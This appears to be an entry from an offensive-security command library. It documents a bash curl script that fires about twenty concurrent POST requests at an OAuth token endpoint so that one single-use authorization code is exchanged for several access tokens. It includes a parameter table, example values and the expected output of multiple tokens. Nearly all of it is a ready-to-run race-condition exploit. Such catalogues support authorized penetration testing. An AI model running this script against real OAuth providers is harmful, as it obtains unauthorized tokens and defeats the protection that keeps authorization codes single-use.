---
id: cmd-curl-access-race-001
data: >-
  #!/bin/bash

  curl --data
  "grant_type=authorization_code&code=AUTHORIZATION_CODE_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET&redirect_uri=APPLICATION_REDIRECT_URI"
  "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &

  # Repeat curl line 20 times
tags:
  - oauth
  - race-condition
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.775Z'
verified: false
validated: true
submitted: true
---
# curl-oauth-access-race

## Command

```bash
#!/bin/bash
curl --data "grant_type=authorization_code&code=AUTHORIZATION_CODE_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET&redirect_uri=APPLICATION_REDIRECT_URI" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &
# Repeat the curl command 20 times for concurrency
```

## Description

This bash script sends multiple concurrent POST requests to the OAuth token endpoint to exploit race conditions, exchanging the same authorization code for multiple access tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| code | Single-use authorization code value | Yes |
| client_id | Application identifier | Yes |
| client_secret | Application secret | Yes |
| redirect_uri | Callback URI registered for the app | Yes |
| grant_type | Fixed to 'authorization_code' | Yes |

## Examples

### Basic Usage

```bash
#!/bin/bash
curl --data "grant_type=authorization_code&code=abc123&client_id=app1&client_secret=secret&redirect_uri=https://example.com/cb" "https://provider.com/oauth/token" &
# Repeat 20x
```

### Advanced Usage

Add -v for verbose: curl -v --data ... &

## Expected Output

Multiple JSON objects like {"access_token": "eyJ...", "refresh_token": "def456", "expires_in": 3600}

## Related

- [[commands/curl-oauth-refresh-race]]
- [[procedures/Exploit-Access-Token-Race-Condition]]
